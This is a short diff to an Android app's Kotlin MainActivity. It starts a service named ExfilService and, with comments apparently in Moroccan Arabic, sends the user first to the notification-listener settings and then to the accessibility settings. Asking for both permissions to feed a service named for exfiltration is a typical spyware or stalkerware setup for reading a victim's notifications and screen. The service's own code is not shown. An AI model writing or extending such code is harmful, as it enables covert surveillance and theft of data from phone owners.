@@ -48,7 +48,13 @@ class MainActivity : AppCompatActivity() {
     private fun startNow() {
         val i = Intent(this, ExfilService::class.java)
         if (Build.VERSION.SDK_INT >= 26) startForegroundService(i) else startService(i)
+        
+        // كتفتح إعدادات الوصول للإشعارات
         startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
+        
+        // كتفتح إعدادات إمكانية الوصول
+        startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
+        
         Toast.makeText(this, "تم", Toast.LENGTH_SHORT).show()
     }
 }
